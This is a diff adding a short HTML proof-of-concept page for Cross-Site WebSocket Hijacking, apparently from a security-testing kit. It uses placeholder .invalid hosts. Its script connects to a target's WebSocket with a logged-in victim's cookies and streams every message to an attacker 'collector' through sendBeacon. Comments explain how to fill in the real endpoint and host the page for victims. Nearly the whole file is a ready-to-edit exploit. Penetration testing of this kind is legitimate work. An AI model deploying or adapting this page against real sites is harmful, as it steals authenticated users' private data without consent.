@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit
+  Cross-Site WebSocket Hijacking PoC (WebSocket kit row 003). INERT: .invalid.
+  Works ONLY if the target's WS endpoint authenticates via cookies and does
+  not validate Origin - exactly what WS-002 baseline establishes.
+
+  WHAT TO EDIT: WS_URL + the subscribe/message frames from your Burp capture.
+  USE: host on YOUR origin; logged-in victim opens it -> page connects to the
+  WS with THEIR cookies, streams messages to your collector.
+-->
+<html>
+<body>
+<h3>CSWSH probe...</h3>
+<script>
+// EDIT:
+const WS_URL = "wss://target.example.invalid/ws";            // victim-authenticated WS
+const COLLECTOR = "https://attacker.example.invalid/ws";     // your listener
+
+const ws = new WebSocket(WS_URL);
+ws.onopen = () => {
+  // EDIT: frames captured from the legit client session:
+  ws.send(JSON.stringify({ type: "subscribe", channel: "notifications" }));
+};
+ws.onmessage = (e) => navigator.sendBeacon(COLLECTOR, e.data);
+ws.onerror = () => document.body.textContent = "connection failed (Origin check or placeholder)";
+// benign mode: replace sendBeacon with console.log(e.data)
+</script>
+</body>
+</html>
